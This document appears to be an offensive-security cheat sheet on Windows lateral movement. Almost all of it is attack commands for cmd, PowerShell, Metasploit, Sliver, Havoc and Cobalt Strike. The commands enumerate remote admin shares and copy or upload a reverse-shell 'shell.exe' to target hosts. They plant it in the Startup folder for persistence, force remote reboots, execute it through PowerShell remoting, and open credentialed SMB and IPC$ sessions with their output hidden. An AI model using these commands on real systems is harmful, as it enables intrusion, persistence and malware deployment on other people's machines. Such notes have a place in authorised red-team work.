# Remote File Access

## 01 - List Files and Directories

### 1.1 - Command Prompt

- List files and directories remotely

`C:\> dir \\<IP>\c$`

- List all the files and directories

`C:\> dir /s /b \\<IP>\c$ > files.txt`

### 1.2 - Metasploit

```
meterpreter > ls \\\\<IP>\\c$

meterpreter > ls //<IP>/c$
```

### 1.3 - Sliver

`sliver (IMPLANT_NAME) > ls //<IP>/c$`

### 1.4 - Havoc

`Demon » dir \\<IP>\c$`

### 1.5 - Cobalt Strike

`beacon> ls \\<IP>\c$`

## 02 - Copy Files

### 2.1 - Command Prompt

#### 2.1.1 - Copy files remotely

```
C:\> copy shell.exe \\<IP>\c$\folder\shell.exe

C:\> xcopy shell.exe \\<IP>\c$\folder\shell.exe

C:\> robocopy <source> <destination> <files>

C:\> robocopy \\<IP>\c$\folder\shell.exe shell.exe
```

#### 2.1.2 - Copy reverse shell callback on `Startup` folder

```
C:\> xcopy shell.exe "\\<IP>\c$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

C:\> robocopy C:\ "\\<IP>\c$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" shell.exe

C:\> shutdown /t 0 /r /m \\<IP>
```

### 2.2 - Powershell

#### 2.2.1 - Copy files remotely

- Method 1:

`PS C:\> Copy-Item shell.exe -destination \\<IP>\c$\shell.exe`

- Method 2:

Copy the callback shell and execute it via powershell cmdlet

```
PS C:\> $ip = New-PSSession -Computer <IP>

PS C:\> Copy-Item "C:\path\to\shell.exe" -Destination "C:\path\to\folder\" -ToSession $ip

PS C:\> icm -Session $ip -ScriptBlock { C:\path\to\shell.exe }
```

#### 2.2.2 - Copy reverse shell callback on `Startup` folder

```
PS C:\> Copy-Item shell.exe -destination "\\<IP>\c$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

PS C:\> Restart-Computer -ComputerName <IP> -Force
```

## 03 - Mapping SMB Drive Network

### 3.1 - Command Prompt

```
C:\> net use Z: \\<IP>\c$

C:\> net use Z: \\<IP>\C$ /user:"<username>" "<password>"

C:\> dir Z:\

C:\> net use Z: /delete
```

### 3.2 - Powershell

`PS C:\> New-PSDrive -Name attacker-share -PSProvider FileSystem -Credential $cred \\<IP>\<share_name>`

## 04 - Manual Null Session

### 4.1 - Command Prompt

Authenticate null session with `IPC$` via net use commands to allow the user to execute any other commands remotely

```
C:\> net use \\<IP>\IPC$ /u:"<username>" "<password>"

C:\> dir \\<IP>

C:\> net view \\<IP>
```

Ignore the authentication while authenticating session

`C:\> net use \\<IP>\IPC$ /u:"<username>" "<password>" > %TEMP%\~temp3936t.tmp 2>&1`

## 05 - Upload Files

### 5.1 - Metasploit

`meterpreter > upload /path/to/shell.exe \\\\<IP>\\c$\\shell.exe`

### 5.2 - Sliver

`sliver (IMPLANT_NAME) > upload /path/to/shell.exe //<IP>/c$/shell.exe`

### 5.3 - Havoc

`Demon » upload /path/to/shell.exe\\<IP>\c$\shell.exe`

### 5.4 - Cobalt Strike

`beacon> upload /home/user/shell.exe \\<IP>\c$\shell.exe`

If that didn't work change directory and then upload it

```
beacon> cd \\<IP>\c$

beacon> upload /home/user/shell.exe
```

## References

- [Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)